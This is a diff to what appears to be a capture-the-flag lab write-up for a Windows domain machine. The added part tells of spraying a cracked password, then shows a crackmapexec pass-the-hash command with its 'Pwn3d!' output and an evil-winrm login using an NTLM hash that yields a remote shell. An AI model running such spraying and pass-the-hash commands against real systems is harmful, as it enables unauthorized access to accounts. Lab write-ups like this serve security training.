@@ -215,6 +215,41 @@ usernames and hashes
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c867ca80-bdac-442f-971e-28c4038e8962)
 
-cracked 1 of the password hash, `ItachiUchiha888`. 
+cracked 1 of the password hash, `ItachiUchiha888`. tried to spray the password across the users, none wrked with it. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/987241b2-95ac-4cb1-9cf7-73e5f2d31014)
+
+Using crackmap exec to spray the hashes againts the users, we can see we have smbclient access. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ crackmapexec winrm 192.168.194.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+SMB         192.168.194.175 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+HTTP        192.168.194.175 5985   RESOURCEDC       [*] http://192.168.194.175:5985/wsman
+HTTP        192.168.194.175 5985   RESOURCEDC       [+] resourced.local\l.livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+HTTP        192.168.194.175 5985   RESOURCEDC       [-] Unexpected error with Neo4J
+HTTP        192.168.194.175 5985   RESOURCEDC       [-] Account not found on the domain
+```
+checking if we could login `winrm` and it was success we couldlogin winrm. 
+
+## Initial Foothold winrm
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ evil-winrm -i 192.168.194.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami 
+resourced\l.livingstone
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
+```
+we login winrm using the username and the hash. 
+
 
 
